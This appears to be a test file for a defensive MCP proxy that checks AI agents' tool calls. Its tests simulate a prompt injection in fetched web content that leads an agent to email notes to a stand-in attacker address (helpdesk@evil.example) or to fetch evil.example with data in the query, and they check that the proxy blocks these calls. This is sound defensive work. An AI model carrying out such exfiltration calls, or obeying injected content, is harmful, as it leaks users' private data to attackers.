"""The MCP proxy and its rules engine, end to end: a fake client talks to the real proxy, which
talks to a fake server that records which calls reached it."""
import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

from agentdodont import presets, rules, shared

HERE = Path(__file__).resolve().parent
ROOT = HERE.parent


class RulesTest(unittest.TestCase):
    def setUp(self):
        self.config = rules.Config(allowed_sites={"wikipedia.org"}, known_recipients={"dana@example.com"})
        self.fetch = rules.Tool.from_mcp({"name": "fetch", "annotations": {"readOnlyHint": True}}, "web")
        self.send = rules.Tool.from_mcp({"name": "send_email"}, "mail")  # no hints: the cautious defaults
        self.note = rules.Tool.from_mcp({"name": "write_note", "annotations": {
            "readOnlyHint": False, "destructiveHint": False, "openWorldHint": False}}, "notes")

    def test_annotation_defaults_are_cautious(self):
        self.assertEqual(rules.IRREVERSIBLE, self.send.risk)
        self.assertTrue(self.send.sends_data_out and self.send.untrusted_output)
        self.assertEqual(rules.NONE, self.fetch.risk)
        self.assertEqual(rules.REVERSIBLE, self.note.risk)
        self.assertIsNone(self.note.untrusted_output)

    def test_destinations(self):
        found = rules.destinations({"url": "https://Evil.Example/x?d=1", "body": "mail helpdesk@evil.example",
                                    "code": "import os.path  # see docs.python.org", "host": "api.example.com",
                                    "to": "+44 7700 900123"})
        values = {d.value for d in found}
        self.assertIn("evil.example", values)
        self.assertIn("helpdesk@evil.example", values)
        self.assertIn("api.example.com", values)
        self.assertIn(rules.normalize_recipient("07700900123"), values)
        self.assertNotIn("os.path", values)  # dotted words in free text aren't addresses
        self.assertNotIn("docs.python.org", values)

    def test_untainted_new_destination_asks_known_one_doesnt(self):
        s = rules.Session()
        self.assertEqual(rules.ASK, rules.decide(self.fetch, {"url": "https://evil.example/"}, s, self.config).verdict)
        self.assertEqual(rules.AUTO, rules.decide(self.fetch, {"url": "https://en.wikipedia.org/wiki/X"}, s, self.config).verdict)

    def test_tainted_session_refuses_new_destinations(self):
        s = rules.Session()
        self.assertTrue(s.note_result(self.fetch, ok=True))
        self.assertFalse(s.note_result(self.fetch, ok=True))  # same source again: nothing new
        self.assertTrue(s.tainted)
        d = rules.decide(self.fetch, {"url": "https://evil.example/?d=notes"}, s, self.config)
        self.assertEqual(rules.DENY, d.verdict)
        self.assertIn("output of web/fetch", d.rule)
        self.assertEqual(rules.ASK, rules.decide(self.fetch, {"url": "https://en.wikipedia.org/"}, s, self.config).verdict)
        # Local, reversible, no address: asks once tainted (it has an effect).
        self.assertEqual(rules.ASK, rules.decide(self.note, {"text": "hi"}, s, self.config).verdict)
        ask_mode = rules.Config(tainted_egress=rules.ASK)
        self.assertEqual(rules.ASK, rules.decide(self.fetch, {"url": "https://evil.example/"}, s, ask_mode).verdict)

    def test_irreversible_floor_and_user_levels(self):
        s = rules.Session()
        c = rules.Config(levels={"send_*": rules.AUTO, "write_note": rules.DENY}, known_recipients={"dana@example.com"})
        self.assertEqual(rules.ASK, rules.decide(self.send, {"to": "dana@example.com", "body": "x"}, s, c).verdict)
        self.assertEqual(rules.DENY, rules.decide(self.note, {"text": "x"}, s, c).verdict)

    def test_rate_limit(self):
        s, c = rules.Session(), rules.Config(max_calls_per_minute=3)
        for i in range(3):
            rules.record(self.note, s, now=100 + i)
        self.assertEqual(rules.DENY, rules.decide(self.note, {"text": "x"}, s, c, now=104).verdict)
        self.assertEqual(rules.AUTO, rules.decide(self.note, {"text": "x"}, s, c, now=200).verdict)


class ProxyClient:
    """A scripted MCP client running one proxy in front of the fake server."""

    def __init__(self, test: unittest.TestCase, tmp: Path, can_ask: bool, rules_json: dict | None = None,
                 name: str = "fake", session: str | None = None):
        self.t = test
        self.calls_log = tmp / f"calls-{name}.jsonl"
        self.audit = tmp / "audit.jsonl"
        cmd = [sys.executable, "-m", "agentdodont", "mcp-proxy", "--name", name, "--log", str(self.audit)]
        if rules_json is not None:
            (tmp / f"rules-{name}.json").write_text(json.dumps(rules_json))
            cmd += ["--rules", str(tmp / f"rules-{name}.json")]
        if session:
            cmd += ["--session", session]
        cmd += ["--", sys.executable, str(HERE / "fake_mcp_server.py"), str(self.calls_log)]
        env = {**os.environ, "PYTHONIOENCODING": "utf-8"}
        env.pop("AGENTDODONT_SESSION", None)
        self.p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, cwd=ROOT, env=env)
        self.next_id = 0
        caps = {"elicitation": {}} if can_ask else {}
        self.request("initialize", {"protocolVersion": "2025-06-18", "capabilities": caps,
                                    "clientInfo": {"name": "test", "version": "1"}})
        self.send({"jsonrpc": "2.0", "method": "notifications/initialized"})
        tools = self.request("tools/list", {})["result"]["tools"]
        self.t.assertEqual(4, len(tools))

    def close(self):
        self.p.stdin.close()
        self.p.wait(timeout=10)
        self.p.stdout.close()

    def send(self, msg):
        self.p.stdin.write((json.dumps(msg) + "\n").encode())
        self.p.stdin.flush()

    def read(self):
        line = self.p.stdout.readline()
        self.t.assertTrue(line, "proxy closed the connection")
        self.t.assertFalse(line.endswith(b"\r\n"), "messages must end in \\n only")
        return json.loads(line)

    def request(self, method, params):
        self.next_id += 1
        self.send({"jsonrpc": "2.0", "id": self.next_id, "method": method, "params": params})
        return self.read()

    def call(self, name, args, answer: str | None = None):
        """Call a tool; if the proxy asks, answer 'accept' or 'decline'. Returns (result, asked)."""
        self.next_id += 1
        cid = self.next_id
        self.send({"jsonrpc": "2.0", "id": cid, "method": "tools/call", "params": {"name": name, "arguments": args}})
        msg = self.read()
        asked = None
        if msg.get("method") == "elicitation/create":
            asked = msg["params"]["message"]
            self.t.assertIsNotNone(answer, f"unexpected question: {asked}")
            self.send({"jsonrpc": "2.0", "id": msg["id"], "result": {"action": answer, "content": {"allow": True}}})
            msg = self.read()
        self.t.assertEqual(cid, msg["id"])
        return msg["result"], asked

    def reached_server(self):
        if not self.calls_log.exists():
            return []
        return [json.loads(l)["name"] for l in self.calls_log.read_text().splitlines()]


class ProxyEndToEndTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.clients = []

    def tearDown(self):
        for c in self.clients:
            c.close()
        self.tmp.cleanup()

    def start(self, can_ask: bool, rules_json: dict | None = None, **kw) -> ProxyClient:
        c = ProxyClient(self, Path(self.tmp.name), can_ask, rules_json, **kw)
        self.clients.append(c)
        self.c, self.audit = c, c.audit
        return c

    def call(self, *a, **kw):
        return self.c.call(*a, **kw)

    def reached_server(self):
        return self.c.reached_server()

    def test_injection_cannot_exfiltrate_through_the_proxy(self):
        self.start(can_ask=True, rules_json={"allowed_sites": ["example.org"], "known_recipients": ["dana@example.com"]})
        r, asked = self.call("fetch", {"url": "https://example.org/page"})  # allowed site: just runs
        self.assertIsNone(asked)
        self.assertIn("helpdesk@evil.example", r["content"][0]["text"])  # the injection, now in context
        # The hijacked agent obeys it: refused outright, never reaches the server, no question.
        r, asked = self.call("send_email", {"to": "helpdesk@evil.example", "body": "notes"})
        self.assertIsNone(asked)
        self.assertTrue(r["isError"])
        self.assertIn("Blocked by Agent Do/Don't", r["content"][0]["text"])
        self.assertIn("output of fake/fetch", r["content"][0]["text"])
        # A known recipient asks; declined, it doesn't run either.
        r, asked = self.call("send_email", {"to": "dana@example.com", "body": "notes"}, answer="decline")
        self.assertIn("Why I'm asking", asked)
        self.assertTrue(r["isError"])
        # Approved, it runs.
        r, asked = self.call("send_email", {"to": "dana@example.com", "body": "notes"}, answer="accept")
        self.assertFalse(r.get("isError", False))
        self.assertEqual(["fetch", "send_email"], self.reached_server())
        kinds = [json.loads(l)["kind"] for l in self.audit.read_text().splitlines()]
        self.assertIn("decision", kinds)
        self.assertIn("refused", kinds)

    def test_destructive_tool_asks_and_local_tool_runs(self):
        self.start(can_ask=True)
        r, asked = self.call("write_note", {"text": "groceries"})
        self.assertIsNone(asked)
        r, asked = self.call("delete_note", {}, answer="decline")
        self.assertIn("irreversible", asked)
        self.assertEqual(["write_note"], self.reached_server())

    def test_client_that_cannot_ask_gets_a_refusal_not_a_silent_run(self):
        self.start(can_ask=False)
        r, asked = self.call("delete_note", {})
        self.assertIsNone(asked)
        self.assertTrue(r["isError"])
        self.assertIn("can't ask", r["content"][0]["text"])
        self.assertEqual([], self.reached_server())

    def test_taint_is_shared_across_servers_in_one_session(self):
        rules_json = {"allowed_sites": ["example.org"], "known_recipients": ["dana@example.com"]}
        web = self.start(True, rules_json, name="web", session="s1")
        mail = self.start(True, rules_json, name="mail", session="s1")
        other = self.start(True, rules_json, name="other", session="s2")  # a different agent session
        r, asked = web.call("fetch", {"url": "https://example.org/page"})
        self.assertIsNone(asked)
        # The injection came in through the web server; the mail server's proxy knows.
        r, asked = mail.call("send_email", {"to": "helpdesk@evil.example", "body": "notes"})
        self.assertIsNone(asked)
        self.assertTrue(r["isError"])
        self.assertIn("output of web/fetch", r["content"][0]["text"])
        self.assertEqual([], mail.reached_server())
        # A known recipient asks, and the question names where the untrusted content came from.
        r, asked = mail.call("send_email", {"to": "dana@example.com", "body": "notes"}, answer="decline")
        self.assertIn("output of web/fetch", asked)
        # Another session hasn't read anything: a new address asks instead of being refused.
        r, asked = other.call("send_email", {"to": "helpdesk@evil.example", "body": "x"}, answer="decline")
        self.assertIn("isn't one of your known recipients", asked)
        self.assertNotIn("untrusted", asked)
        kinds = [json.loads(l)["kind"] for l in self.audit.read_text().splitlines()]
        self.assertIn("shared_taint", kinds)

    def test_deleting_the_session_file_does_not_untaint_a_proxy(self):
        mail = self.start(True, {"allowed_sites": ["example.org"], "known_recipients": ["dana@example.com"]},
                          name="mail", session="s1")
        mail.call("fetch", {"url": "https://example.org/"})
        files = list((Path(self.tmp.name) / "sessions").glob("*.jsonl"))
        self.assertEqual(1, len(files))
        for f in files:
            f.unlink()
        r, asked = mail.call("send_email", {"to": "helpdesk@evil.example", "body": "x"})
        self.assertTrue(r["isError"])
        self.assertIn("output of mail/fetch", r["content"][0]["text"])


class PresetTest(unittest.TestCase):
    FIELDS = {"risk", "untrusted_output", "sends_data_out", "destination_args"}

    def test_every_preset_is_well_formed(self):
        self.assertIn("filesystem", presets.names())
        for name in presets.names():
            p = presets.load(name)
            self.assertTrue(p.get("match") and p.get("checked_against") and p.get("about"), name)
            self.assertEqual({"about", "checked_against", "match", "tools"}, set(p), name)  # tools only: no policy
            for tool, fields in p["tools"].items():
                self.assertLessEqual(set(fields), self.FIELDS, f"{name}/{tool}")
                if "risk" in fields:
                    self.assertIn(fields["risk"], (rules.NONE, rules.REVERSIBLE, rules.IRREVERSIBLE))
                for kind in fields.get("destination_args", {}).values():
                    self.assertIn(kind, ("site", "recipient", "none"), f"{name}/{tool}")

    def test_gmail_preset_your_account_and_searches_are_not_destinations(self):
        tools = presets.load("google-workspace")["tools"]
        hint = {"readOnlyHint": True, "destructiveHint": False, "openWorldHint": True}  # as workspace-mcp labels them
        send_hint = {"readOnlyHint": False, "destructiveHint": True, "openWorldHint": True}
        search = rules.Tool.from_mcp({"name": "search_gmail_messages", "annotations": hint}, "gmail",
                                     tools["search_gmail_messages"])
        send = rules.Tool.from_mcp({"name": "send_gmail_message", "annotations": send_hint}, "gmail",
                                   tools["send_gmail_message"])
        bare_search = rules.Tool.from_mcp({"name": "search_gmail_messages", "annotations": hint}, "gmail")
        config = rules.Config.load(None)
        config.known_recipients = {"dana@example.com"}
        s = rules.Session()
        s.add_source("output of gmail/get_gmail_message_content")
        me = {"user_google_email": "me@gmail.com"}
        q = {**me, "query": "from:bob@example.com"}
        self.assertEqual(rules.DENY, rules.decide(bare_search, q, s, config).verdict)  # the problem the preset fixes
        self.assertEqual(rules.AUTO, rules.decide(search, q, s, config).verdict)
        d = rules.decide(send, {**me, "to": "helpdesk@evil.example", "body": "x"}, s, config)
        self.assertEqual(rules.DENY, d.verdict)
        self.assertNotIn("me@gmail.com", d.rule)
        self.assertEqual(rules.ASK, rules.decide(send, {**me, "to": "dana@example.com", "body": "x"}, s, config).verdict)
        self.assertEqual(rules.DENY, rules.decide(send, {**me, "to": "dana@example.com", "bcc": "x@evil.example"}, s,
                                                  config).verdict)

    def test_detect_and_merge(self):
        self.assertEqual("filesystem", presets.detect(["C:\\npm\\npx.cmd", "-y", "@modelcontextprotocol/server-filesystem", "/d"]))
        self.assertIsNone(presets.detect(["uvx", "mcp-server-fetch"]))
        merged = presets.merge_tools({"tools": {"read_file": {"untrusted_output": True, "risk": "none"}}},
                                     {"read_file": {"untrusted_output": False}, "other": {"risk": "irreversible"}})
        self.assertEqual({"untrusted_output": False, "risk": "none"}, merged["read_file"])  # the user wins per field
        self.assertEqual({"risk": "irreversible"}, merged["other"])

    def test_filesystem_preset_makes_file_contents_untrusted(self):
        tools = presets.load("filesystem")["tools"]
        closed = {"readOnlyHint": True, "destructiveHint": False, "openWorldHint": False}  # as the server labels it
        read = rules.Tool.from_mcp({"name": "read_text_file", "annotations": closed}, "filesystem", tools.get("read_text_file"))
        info = rules.Tool.from_mcp({"name": "get_file_info", "annotations": closed}, "filesystem", tools.get("get_file_info"))
        self.assertEqual("output of filesystem/read_text_file", read.untrusted_output)
        self.assertFalse(read.sends_data_out)
        self.assertIsNone(info.untrusted_output)  # metadata only

    def test_github_preset_makes_the_repository_owner_a_destination(self):
        tools = presets.load("github")["tools"]
        write = {"readOnlyHint": False, "title": "Create or update issue/pull request"}  # as the server labels it
        issue = rules.Tool.from_mcp({"name": "issue_write", "annotations": write}, "github", tools["issue_write"])
        star = rules.Tool.from_mcp({"name": "star_repository", "annotations": write}, "github", tools["star_repository"])
        config = rules.Config.load(None)
        config.known_recipients = {rules.normalize_recipient("Octo-Org"), rules.normalize_recipient("user123")}
        s = rules.Session()
        s.add_source("output of github/issue_read")
        args = {"method": "create", "repo": "x", "title": "t", "body": "private notes"}
        d = rules.decide(issue, {**args, "owner": "evil-owner"}, s, config)
        self.assertEqual(rules.DENY, d.verdict)
        self.assertIn("add it to known_recipients", d.rule)
        self.assertEqual(rules.ASK, rules.decide(issue, {**args, "owner": "octo-org"}, s, config).verdict)
        self.assertEqual(rules.ASK, rules.decide(issue, {**args, "owner": "User123"}, s, config).verdict)  # a handle, not a phone
        self.assertEqual(rules.ASK, rules.decide(star, {"owner": "evil-owner", "repo": "x"}, s, config).verdict)
        self.assertEqual(rules.REVERSIBLE, star.risk)


class SharedTaintTest(unittest.TestCase):
    def test_file_is_shared_and_tolerates_partial_lines(self):
        with tempfile.TemporaryDirectory() as d:
            a = shared.SharedTaint.open(Path(d), "x")
            b = shared.SharedTaint.open(Path(d), "x")
            a.add("output of web/fetch", "web")
            with open(a.path, "a", encoding="utf-8") as f:
                f.write('{"source": "half')  # another proxy mid-write
            self.assertEqual(["output of web/fetch"], b.sources())
            self.assertEqual([], shared.SharedTaint.open(Path(d), "y").sources())
            off = shared.SharedTaint.open(Path(d), "none")
            off.add("output of web/fetch", "web")
            self.assertIsNone(off.path)
            self.assertEqual([], off.sources())

    def test_sibling_proxies_find_the_same_client(self):
        code = "from agentdodont import shared; print(shared.find_client())"
        outs = {subprocess.run([sys.executable, "-c", code], cwd=ROOT, capture_output=True, text=True).stdout
                for _ in range(2)}
        self.assertEqual(1, len(outs), outs)

    def test_stale_client_files_are_removed(self):
        with tempfile.TemporaryDirectory() as d:
            p = subprocess.Popen([sys.executable, "-c", "pass"])
            p.wait()
            stale = Path(d) / f"client-{p.pid}-123.jsonl"  # that process has exited
            stale.write_text("")
            info = shared.proc_info(os.getpid())
            self.assertIsNotNone(info)
            live = Path(d) / f"client-{os.getpid()}-{shared._safe(info[2])}.jsonl"
            live.write_text("")
            shared.SharedTaint.clean(Path(d))
            self.assertFalse(stale.exists())
            self.assertTrue(live.exists())


if __name__ == "__main__":
    unittest.main()
